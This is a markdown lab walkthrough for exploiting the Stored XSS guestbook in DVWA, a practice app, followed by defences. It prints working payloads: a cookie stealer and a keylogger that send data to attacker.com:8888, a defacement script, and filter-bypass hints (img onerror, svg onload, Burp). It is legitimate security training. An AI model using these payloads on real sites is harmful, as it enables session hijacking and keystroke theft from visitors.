# 💾 XSS - Stored

## What is Stored XSS?

Stored XSS (also called Persistent XSS) occurs when malicious script is saved to the database and served to every user who views that page. Unlike Reflected XSS, the victim does not need to click a special link — simply visiting the page triggers the attack.

---

## DVWA Module

The DVWA Stored XSS module is a guestbook form. It saves the `name` and `message` fields to the database and displays them to all visitors:

```php
// Vulnerable code (Low level)
$message = $_POST['mtxMessage'];
$name    = $_POST['txtName'];
// Saved to DB without sanitization
// Displayed without encoding
```

---

## Step-by-Step Exploitation

### Step 1 — Basic test

In the **Message** field, enter:

```html
<script>alert('Stored XSS')</script>
```

Submit the form. Reload the page — the alert fires for every visitor.

---

### Step 2 — Persistent cookie stealer

Every user who loads the guestbook page will send their cookie to the attacker:

```html
<script>new Image().src='http://attacker.com:8888/steal?c='+document.cookie;</script>
```

Start a listener on attacker machine:

```bash
python3 -m http.server 8888
```

Now every visitor's session cookie appears in your terminal.

---

### Step 3 — Defacement payload

Replaces the entire page content for every visitor:

```html
<script>document.body.innerHTML='<h1 style="color:red;text-align:center">HACKED</h1>'</script>
```

---

### Step 4 — Keylogger

Captures every keystroke from every visitor:

```html
<script>
document.onkeypress = function(e){
  new Image().src='http://attacker.com:8888/key?k='+e.key;
}
</script>
```

---

### Bypass the character limit

The `name` field has a `maxlength="10"` attribute in HTML. This is client-side only. Use Burp Suite to intercept and modify the request — send a longer payload in the `txtName` field.

---

## Payloads

See [`payloads.txt`](./payloads.txt)

---

## Security Levels

| Level | Protection |
|-------|-----------|
| Low | No filtering at all |
| Medium | Filters `<script>` tag in message — use `name` field or event handlers |
| High | Strict filtering — try `<img onerror>` or `<svg onload>` |
| Impossible | `htmlspecialchars()` on all output + token validation |

---

## Difference: Reflected vs Stored

| | Reflected XSS | Stored XSS |
|--|--------------|-----------|
| Persistence | One-time (via URL) | Permanent (in DB) |
| Victim | Must click a crafted link | Anyone who visits the page |
| Severity | Medium | High |
| Example | Search result page | Comments, guestbooks, profiles |

---

## How to Defend

- Encode all output with `htmlspecialchars()` before rendering in HTML
- Sanitize and validate input on the server side before storing
- Implement a **Content Security Policy (CSP)** header
- Use `HttpOnly` and `Secure` flags on cookies
- Limit input length and character sets at the server level (not just client-side)
